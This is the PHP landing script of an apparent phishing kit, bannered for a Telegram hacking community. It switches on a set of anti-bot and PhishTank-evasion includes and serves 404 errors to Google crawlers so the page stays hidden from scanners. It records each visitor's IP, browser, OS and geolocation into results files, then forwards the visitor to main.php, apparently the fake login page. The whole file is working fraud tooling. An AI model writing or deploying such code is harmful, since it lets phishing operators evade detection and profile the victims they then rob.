<?php
/*
       t . m e / b i g s e c c o m m u n i t y 

   ▄▄▄▄███▄▄▄▄      ▄████████    ▄████████    ▄████████ 
 ▄██▀▀▀███▀▀▀██▄   ███    ███   ███    ███   ███    ███ 
 ███   ███   ███   ███    ███   ███    ███   ███    █▀  
 ███   ███   ███   ███    ███  ▄███▄▄▄▄██▀   ███        
 ███   ███   ███ ▀███████████ ▀▀███▀▀▀▀▀   ▀███████████ 
 ███   ███   ███   ███    ███ ▀███████████          ███ 
 ███   ███   ███   ███    ███   ███    ███    ▄█    ███ 
  ▀█   ███   █▀    ███    █▀    ███    ███  ▄████████▀  
                                ███    ███              

 M a n i A k a R i s k  | B i g s e c  C o m m u n i t y 
 */
session_start();
error_reporting(0);
$antibots = trim(file_get_contents("admin/config/status_antibots.ini"));
$block_vpn = trim(file_get_contents("admin/config/blockVpn.ini"));
include 'admin/config.php';
if($antibots == "on"){
include "antibots/#1.php";
include "antibots/#2.php";
include "antibots/#3.php";
include "antibots/#4.php";
include "antibots/#5.php";
include "antibots/#6.php";
include "antibots/#7.php";
include "antibots/#8.php";
include "antibots/#9.php";
include "antibots/#10.php";
include "antibots/#11.php";
include "antibots/#12.php";
include "antibots/antibot_host.php";
include "antibots/antibot_ip.php";
include "antibots/antibot_phishtank.php";
include "antibots/antibot_userAgent.php";
}
if($block_vpn == "on") {
    require_once 'antibots/proxyblock.php';
    
}
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
$ip = $_SERVER['REMOTE_ADDR'];
$browser = $_SERVER['HTTP_USER_AGENT'];
$TheirDate = date('d/m/Y');
$TheirTime = date('G:i:s');
$details = "http://ip-api.com/json/{$ip}";
include 'results/click.php';
file_put_contents('results/total_click.txt', $ip . PHP_EOL, FILE_APPEND);
file_put_contents('results/UserAgents.txt', $browser . PHP_EOL, FILE_APPEND);
require 'results/geo.php';
$_SESSION['ip'] = clientData('ip');
$_SESSION['ip_countryName'] = clientData('country');
$_SESSION['ip_countryCode'] = clientData('code');
$_SESSION['ip_city'] = clientData('city');
$_SESSION['ip_state'] = clientData('state');
$_SESSION['ip_timezone'] = clientData('timezone');
$_SESSION['currency'] = clientData('currency');
$_SESSION['os'] = getOs();
$_SESSION['browser'] = getBrowser();
date_default_timezone_set('GMT');
$dateNow = date("d/m/Y H:i:s A");
$code = "{$_SESSION['ip']} | {$dateNow} | {$_SESSION['os']} | {$_SESSION['browser']} | {$_SESSION['computer']} | {$_SESSION['ip_countryName']} | {$_SESSION['ip_city']} | {$_SESSION['ip_state']} | {$_SESSION['currency']}\r\n";
$save = fopen("results/info.txt", "a+");
fwrite($save, $code);
fclose($save);
header("Location: main.php");
exit;
?>
